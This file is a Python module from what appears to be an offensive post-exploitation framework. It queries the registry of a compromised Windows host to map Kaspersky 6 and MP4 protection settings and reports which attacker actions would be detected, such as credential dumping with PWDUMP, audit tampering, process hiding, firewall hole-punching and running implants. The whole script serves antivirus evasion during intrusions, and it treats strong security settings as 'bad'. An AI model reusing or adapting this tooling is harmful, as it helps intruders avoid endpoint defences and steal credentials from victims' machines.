
import dsz, dsz.lp, dsz.env, dsz.file, shutil, subprocess, re, StringIO, datetime, binascii, shared

def kasVerSix(kasName, kasDescription, kasVersion, kasRoot):
    doNotRun = '|   YAK'
    logDir = dsz.lp.GetLogsDirectory()
    kasXmlFilePtr = open((logDir + '\\kasperskyfile.xml'), 'w')
    kasXmlFilePtr.write('<kaspersky_settings>\n')
    kasXmlFilePtr.write('\t<vendor>KASPERSKY</vendor>\n')
    kasXmlFilePtr.write((('\t<version>' + shared.xmlScrub(kasVersion)) + '</version>\n'))
    kasXmlFilePtr.write((('\t<description>' + shared.xmlScrub(kasName)) + '</description>\n'))
    kasXmlFilePtr.write((('\t<root>' + shared.xmlScrub(kasRoot)) + '</root>\n'))
    shared.safePrint('+---------------------------------------------------------------------------------')
    shared.safePrint('|   THE SCRIPT HAS IDENTIFIED KASPERSKY VERSION 6 FOR WINDOWS WORKSTATIONS.')
    shared.safePrint('|   THIS VERSION OF THE KASPERSKY SCRIPT USES REGISTRY QUERIES, BUT IS ONLY')
    shared.safePrint('|   A QUICK AND DIRTY REVIEW OF THE SETTINGS.')
    shared.safePrint('+------------------------------------+-------+------------------------------------')
    dsz.control.echo.Off()
    shared.safePrint(('|   %s   %s %s' % (shared.padOutput(30, 'SETTING'), '| VALUE', '|   STATUS')))
    shared.safePrint('+------------------------------------+-------+------------------------------------')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles -recursive'
    if (not dsz.cmd.Run(regGetCmd)):
        shared.safePrint('!!!RECURSIVE REGISTRY QUERY FAILED!!!')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking -value enabled'
    regLabel = 'BEHAVIOR BLOCKING:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Anti_Hacker\\profiles\\fw -value enabled'
    regLabel = 'FIREWALL STATUS:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Anti_Hacker\\profiles\\fw\\settings -value protectionlevel'
    regValue = shared.basicRegquery(regGetCmd)
    kasXmlFilePtr.write('\t<setting>\n\t\t<setting_name>Firewall Protection Level</setting_name>\n')
    if (regValue == '1'):
        shared.safePrint(('|   FIREWALL PROTECTION:             |   %s   |   !!!HIGH SECURITY!!! (THIS IS BAD)' % regValue))
        kasXmlFilePtr.write('\t\t<setting_value>High Security</setting_value>\n\t</setting>\n')
    elif (regValue == '2'):
        shared.safePrint(('|   FIREWALL PROTECTION:             |   %s   |   !!!TRAINING MODE!!! (THIS IS BAD)' % regValue))
        kasXmlFilePtr.write('\t\t<setting_value>Training Mode</setting_value>\n\t</setting>\n')
    elif (regValue == '3'):
        shared.safePrint(('|   FIREWALL PROTECTION:             |   %s   |   LOW SECURITY' % regValue))
        kasXmlFilePtr.write('\t\t<setting_value>Low Security</setting_value>\n\t</setting>\n')
    elif (regValue == '4'):
        shared.safePrint(('|   FIREWALL PROTECTION:             |   %s   |   OFF' % regValue))
        kasXmlFilePtr.write('\t\t<setting_value>off</setting_value>\n\t</setting>\n')
    else:
        kasXmlFilePtr.write('\t\t<setting_value>Unknown</setting_value>\n\t</setting>\n')
        shared.safePrint(('FIREWALL PROTECTION:                 |   %s   |   (!!!UNKNOWN!!!)' % regValue))
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings -value bWatchSystemAccount'
    regLabel = 'SYSTEM ACCOUNT WATCHING:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings -value bBehaviourEnabled'
    regLabel = 'APP ACTIVITY MONITOR:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings -value bRegMonitoring_Enabled'
    regLabel = 'REGISTRY MONITOR:'
    regValue = shared.basicRegquery(regGetCmd)
    if (regValue == '1'):
        doNotRun = (doNotRun + '\n|   POKING HOLES IN THE FIREWALL')
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings\\Set\\0000 -value bEnabled'
    regLabel = 'DANGEROUS BEHAVIOR MONITOR:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings\\Set\\0002 -value bEnabled'
    regLabel = 'PROCESS INJECTION PROTECTION:'
    regValue = shared.basicRegquery(regGetCmd)
    if (regValue == '1'):
        doNotRun = (doNotRun + '\n|   RUNASCHILD, RUNASSYSTEM, PWDUMP, OR MODIFYAUDIT')
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings\\Set\\0003 -value bEnabled'
    regLabel = 'PROCESS HIDING PROTECTION:'
    regValue = shared.basicRegquery(regGetCmd)
    if (regValue == '1'):
        doNotRun = (doNotRun + '\n|   HIDING PROCESSES')
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Behavior_Blocking\\profiles\\pdm\\settings\\Set\\0007 -value bEnabled'
    regLabel = 'KEYLOGGER DETECTION:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\Web_Monitoring\\profiles\\httpscan\\ -value enabled'
    regLabel = 'HTTP PORT LOGGING:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\TrafficMonitor\\settings\\ -value DecodeSSL'
    regLabel = 'DECODE SSL:'
    regValue = shared.basicRegquery(regGetCmd)
    outputBinData(regLabel, regValue, kasXmlFilePtr)
    shared.safePrint('+------------------------------------+-------+------------------------------------')
    shared.safePrint('|    PORT MONITORING:')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\avp6\\profiles\\TrafficMonitor\\settings\\def\\ports\\ -recursive'
    if dsz.cmd.Run(regGetCmd, dsz.RUN_FLAG_RECORD):
        regName = dsz.cmd.data.Get('key::value::name', dsz.TYPE_STRING)
        regValue = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
        portValue = ''
        portDesc = ''
        portEnabled = ''
        shared.safePrint('|      +--------+----------------------+---------+')
        shared.safePrint('|      | PORT   |    DESCRIPTION       |MONITORED|')
        shared.safePrint('|      +--------+----------------------+---------+')
        kasXmlFilePtr.write('\t<monitored_ports>\n')
        for i in range(len(regName)):
            if (regName[i] == 'enabled'):
                portValue = regValue[(i - 3)]
                portDesc = regValue[(i - 2)]
                if (regValue[i] == '1'):
                    portEnabled = 'TRUE'
                    kasXmlFilePtr.write((('\t\t<monitored_port>' + portValue) + '</monitored_port>\n'))
                else:
                    portEnabled = 'FALSE'
                for j in range(6):
                    if (len(portValue) < 6):
                        portValue = (portValue + ' ')
                    else:
                        break
                for j in range(20):
                    if (len(portDesc) < 20):
                        portDesc = (portDesc + ' ')
                    else:
                        break
                for j in range(7):
                    if (len(portEnabled) < 7):
                        portEnabled = (portEnabled + ' ')
                    else:
                        break
                shared.safePrint(('|      | %s | %s | %s |' % (portValue, portDesc, portEnabled)))
        shared.safePrint('|      +--------+----------------------+---------+')
        shared.safePrint('+---------------------------------------------------------------------------------')
        kasXmlFilePtr.write('\t</monitored_ports>\n')
        kasXmlFilePtr.write('</kaspersky_settings>\n')
    else:
        shared.safePrint('PORT MONITORING REGISTRY QUERY FAILED')
    shared.safePrint('| !!!WARNING!!! BASED ON THE ABOVE SETTINGS, DOING THE FOLLOWING WOULD BE STUPID:')
    shared.safePrint('+---------------------------------------------------------------------------------')
    shared.safePrint(doNotRun)
    shared.safePrint('+---------------------------------------------------------------------------------')
    return True

def outputBinData(regLabel, regValue, kasXmlFilePtr):
    kasXmlFilePtr.write((('\t<setting>\n\t\t<setting_name>' + regLabel) + '</setting_name>\n'))
    regLabel = shared.padOutput(30, regLabel)
    if (regValue == '1'):
        outputVal = 'ENABLED'
    elif (regValue == '0'):
        outputVal = 'DISABLED'
    else:
        outputVal = 'UNKNOWN'
    shared.safePrint(('|   %s   |   %s   |   %s' % (regLabel, regValue, outputVal)))
    kasXmlFilePtr.write((('\t\t<setting_value>' + outputVal) + '</setting_value>\n\t</setting>\n'))

def kasVerSixMp4(kasName, kasDescription, kasVersion, kasRoot):
    doNotRun = '|  RUNNING PWDUMP OR MODIFYAUDIT IF YOU ARE AN EXECUTABLE'
    logDir = dsz.lp.GetLogsDirectory()
    kasXmlFilePtr = open((logDir + '\\kasperskyfile.xml'), 'w')
    kasXmlFilePtr.write('<kaspersky_settings>\n')
    kasXmlFilePtr.write('\t<vendor>KASPERSKY</vendor>\n')
    kasXmlFilePtr.write((('\t<version>' + shared.xmlScrub(kasVersion)) + '</version>\n'))
    kasXmlFilePtr.write((('\t<description>' + shared.xmlScrub(kasName)) + '</description>\n'))
    kasXmlFilePtr.write((('\t<root>' + shared.xmlScrub(kasRoot)) + '</root>\n'))
    shared.safePrint('+---------------------------------------------------------------------------------')
    shared.safePrint('|   THE SCRIPT HAS IDENTIFIED KASPERSKY VERSION 6 FOR WINDOWS WORKSTATIONS MP4.')
    shared.safePrint('|   THIS VERSION OF THE KASPERSKY SCRIPT USES REGISTRY QUERIES, BUT IS ONLY')
    shared.safePrint('|   A QUICK AND DIRTY REVIEW OF THE SETTINGS.')
    shared.safePrint('+---------------------------------------------------------------------------------')
    dsz.control.echo.Off()
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles -recursive'
    dsz.cmd.Run(regGetCmd)
    shared.safePrint('+------------------------------------------+------------+------------+-----------+')
    shared.safePrint((((((((('| ' + shared.padOutput(40, 'IDS RULE DESCRIPTION')) + ' | ') + shared.padOutput(10, 'STATUS')) + ' | ') + shared.padOutput(10, 'LOGGING')) + ' | ') + shared.padOutput(10, 'ACTION')) + '|'))
    shared.safePrint('+------------------------------------------+------------+------------+-----------+')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\regguard2'
    if shared.compRegQuery(regGetCmd, 'REGISTRY GUARD', kasXmlFilePtr):
        doNotRun = (doNotRun + '\n|  LISTENING ON TARGET PORTS\n|  RUNNING HANDLE\n|  UNINSTALLING YAK OR DARKSKYLINE')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0015'
    if shared.compRegQuery(regGetCmd, 'SUSPICIOUS DNS REQUEST PROTECTION', kasXmlFilePtr):
        doNotRun = (doNotRun + '\n|  RUNNING NETMAP IF YOU ARE AN EXECUTABLE')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0000'
    shared.compRegQuery(regGetCmd, 'P2P WORM PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0001'
    shared.compRegQuery(regGetCmd, 'TROJAN PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0002'
    if shared.compRegQuery(regGetCmd, 'KEY LOGGER PROTECTION', kasXmlFilePtr):
        doNotRun = (doNotRun + '\n|  RUNNING YAK')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0003'
    shared.compRegQuery(regGetCmd, 'HIDDEN DRIVER PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0004'
    shared.compRegQuery(regGetCmd, 'KERNEL MODIFICATION PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0005'
    shared.compRegQuery(regGetCmd, 'HIDDEN OBJECT PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0006'
    shared.compRegQuery(regGetCmd, 'HIDDEN PROCESS PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0008'
    shared.compRegQuery(regGetCmd, 'FILE MODIFICATION PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0010'
    shared.compRegQuery(regGetCmd, 'PROCESS INTRUSION PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0011'
    shared.compRegQuery(regGetCmd, 'IO REDIRECTION PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0012'
    shared.compRegQuery(regGetCmd, 'SUSPICIOUS REGISTRY ACCESS PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0013'
    shared.compRegQuery(regGetCmd, 'DATA XFER USING TRUSTED APP PROTECTION', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0014'
    shared.compRegQuery(regGetCmd, 'SUSPICIOUS SYSTEM ACTIVITY MONITOR', kasXmlFilePtr)
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\Behavior_Blocking2\\profiles\\pdm2\\settings\\set\\0016'
    shared.compRegQuery(regGetCmd, 'PROTECTED STORAGE ACCESS PROTECTION', kasXmlFilePtr)
    shared.safePrint('+------------------------------------------+------------+------------+-----------+')
    shared.safePrint('|  FIREWALL SETTINGS')
    shared.safePrint('+--------------------------------------------------------------------------------+')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\AVP80\\profiles\\Anti_Hacker\\profiles\\fw\\ -value enabled'
    dsz.cmd.Run(regGetCmd, dsz.RUN_FLAG_RECORD)
    regValue = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
    if ('0' == regValue[0]):
        shared.safePrint('|   FIREWALL STATUS:                DISABLED')
    elif ('1' == regValue[0]):
        shared.safePrint('|   FIREWALL STATUS:                ENABLED')
    else:
        shared.safePrint('|   FIREWALL STATUS:                UNKNOWN')
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\AVP80\\profiles\\Anti_Hacker\\profiles\\fw\\settings -value protectionlevel'
    dsz.cmd.Run(regGetCmd, dsz.RUN_FLAG_RECORD)
    regValue = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
    if (regValue[0] == '1'):
        fwSetting = 'HIGH'
    elif (regValue[0] == '2'):
        fwSetting = 'TRAINING MODE'
    elif (regValue[0] == '2'):
        fwSetting = 'TRAINING MODE'
    elif (regValue[0] == '3'):
        fwSetting = 'LOW'
    elif (regValue[0] == '4'):
        fwSetting = 'OFF'
    else:
        fwSetting = 'UNKNOWN'
    shared.safePrint(('|   PROTECTION LEVEL:               %s (%s)' % (fwSetting, regValue[0])))
    regGetCmd = 'registryquery -hive l -key software\\Kasperskylab\\protected\\avp80\\profiles\\TrafficMonitor\\settings\\Ports\\ -recursive'
    dsz.cmd.Run(regGetCmd, dsz.RUN_FLAG_RECORD)
    try:
        regName = dsz.cmd.data.Get('key::value::name', dsz.TYPE_STRING)
        regValue = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
    except:
        regName = ''
        regVal = ''
        shared.safePrint('+--------------------------------------------------------------------------------+')
        shared.safePrint('|  !!!ERROR CHECKING TrafficMonitor (PORT) SETTINGS; PROCEED WITH CAUTION!!!')
        shared.safePrint('+--------------------------------------------------------------------------------+')
    portValue = ''
    portDesc = ''
    portEnabled = ''
    shared.safePrint('|   PORT MONITORING:')
    shared.safePrint('|      +--------+----------------------+---------+')
    shared.safePrint('|      | PORT   |    DESCRIPTION       |MONITORED|')
    shared.safePrint('|      +--------+----------------------+---------+')
    kasXmlFilePtr.write('\t<monitored_ports>\n')
    for i in range(len(regName)):
        if (regName[i] == 'Description'):
            portValue = regValue[(i - 1)]
            portDesc = regValue[i]
            if (regValue[(i - 2)] == '1'):
                portEnabled = 'TRUE'
                kasXmlFilePtr.write((('\t\t<monitored_port>' + portValue) + '</monitored_port>\n'))
            else:
                portEnabled = 'FALSE'
            for j in range(6):
                if (len(portValue) < 6):
                    portValue = (portValue + ' ')
                else:
                    break
            for j in range(20):
                if (len(portDesc) < 20):
                    portDesc = (portDesc + ' ')
                else:
                    break
            for j in range(7):
                if (len(portEnabled) < 7):
                    portEnabled = (portEnabled + ' ')
                else:
                    break
            shared.safePrint(('|      | %s | %s | %s |' % (portValue, portDesc, portEnabled)))
    shared.safePrint('|      +--------+----------------------+---------+')
    shared.safePrint('+--------------------------------------------------------------------------------+')
    kasXmlFilePtr.write('<kaspersky_settings>\n')
    shared.safePrint('| !!!WARNING!!! BASED ON THE ABOVE SETTINGS, DOING THE FOLLOWING WOULD BE STUPID:')
    shared.safePrint('+--------------------------------------------------------------------------------+')
    shared.safePrint(doNotRun)
    shared.safePrint('+--------------------------------------------------------------------------------+')
    return True